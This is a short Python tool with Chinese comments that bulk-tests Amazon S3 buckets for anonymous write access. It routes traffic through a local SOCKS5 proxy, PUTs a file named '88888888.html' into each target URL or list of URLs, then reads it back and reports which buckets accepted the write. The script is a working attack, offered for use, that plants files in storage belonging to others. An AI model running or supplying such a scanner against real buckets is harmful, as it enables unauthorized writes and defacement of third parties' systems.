#coding:utf-8
import os
import socks
import socket
import requests
import argparse
from urllib.parse import urljoin
#def Proxy(proxy):
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 2333)#代理自己可改
socket.socket = socks.socksocket
print("批量检测S3存储桶PUT，无需登录aws")
print("默认代理127.0.0.1:2333，需要改请改")
print("")
def Exploit(u):
    header={ 'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36',
        'content-type':'application/x-www-form-urlencoded'}
    data={'数据已经成功写入------------2022.5':1}    #报错数据格式
    
    try:       
        puturl = urljoin(u, "88888888.html")   
        r=requests.put(puturl,data=data,headers=header,verify=False) 
        rr=requests.get(puturl,headers=header, verify=False)
        
        if(rr.status_code==200):               
                  print(rr.url)
                  print(rr.status_code)
                  print(f"写入成功，写入地址为:{puturl}")
                  print("")
        else:
                  print(rr.url)
                  print(rr.status_code)
                  print(f"存储桶未开启写入权限")
    except Exception as e:
        print(e)
        print("异常")
        pass
def main():
    parser = argparse.ArgumentParser(description='S3存储桶批量检测PUT')
    parser.add_argument('-f',help='url file',required=False)
    parser.add_argument('-u',help='target url',required=False)
    args = parser.parse_args()
    if args.u:
        Exploit(args.u)
    if args.f:
        with open (args.f) as f:
            for i in f.readlines():
                i = i.strip()
                
                Exploit(i)

if __name__ == '__main__':
    main()
    